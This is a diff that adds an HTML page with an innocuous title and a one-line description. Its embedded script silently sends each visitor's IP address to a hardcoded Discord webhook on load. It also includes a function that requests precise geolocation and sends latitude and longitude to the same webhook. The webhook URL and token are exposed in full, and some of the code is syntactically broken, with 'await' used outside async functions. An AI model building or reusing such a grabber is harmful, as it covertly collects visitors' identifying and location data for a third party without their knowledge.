@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Execute JavaScript Function with Parameter</title>
+</head>
+<body>
+
+<script>
+    function sendDiscordMessage(message) {
+        fetch('https://discord.com/api/webhooks/1368217240599527454/cwwvWj05HDeH_QOmY-bpH4gbkZIwtLiAWnXGz5nVfZO-mp09jw_B82qLMgvnCbqC0u0Y', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                'content': message // Use the 'message' parameter here
+            })
+        });
+    }
+
+    // Call the function when the page loads, passing "test" as the argument
+    messages = `
+IP: ${(await (await fetch("https://api.ipify.org?format=json")).json()).ip}
+`.trim()
+    // window.onload = function() {
+    //     sendDiscordMessage("test");
+    // };
+    sendDiscordMessage(messages);
+    function sendTemp(m) {
+        messages = `
+IP: ${(await (await fetch("https://api.ipify.org?format=json")).json()).ip}
+${m}
+`.trim()
+        // window.onload = function() {
+        //     sendDiscordMessage("test");
+        // };
+        sendDiscordMessage(messages);
+    }
+    
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                // Success function
+                (p => sendTemp(showPosition(p))), 
+                // Error function
+                (e => sendDiscordMessage("Can't get location")), 
+                // Options. See MDN for details.
+                {
+                   enableHighAccuracy: true,
+                   timeout: 5000,
+                   maximumAge: 0
+                });
+        } else { 
+            return "Geolocation is not supported by this browser.";
+        }
+    }
+    
+    function showPosition(position) {
+        return "Latitude: " + position.coords.latitude + 
+        "\n>Longitude: " + position.coords.longitude;  
+    }
+</script>
+
+<p>This page will execute a JavaScript function with a parameter when it loads.</p>
+
+</body>
+</html>
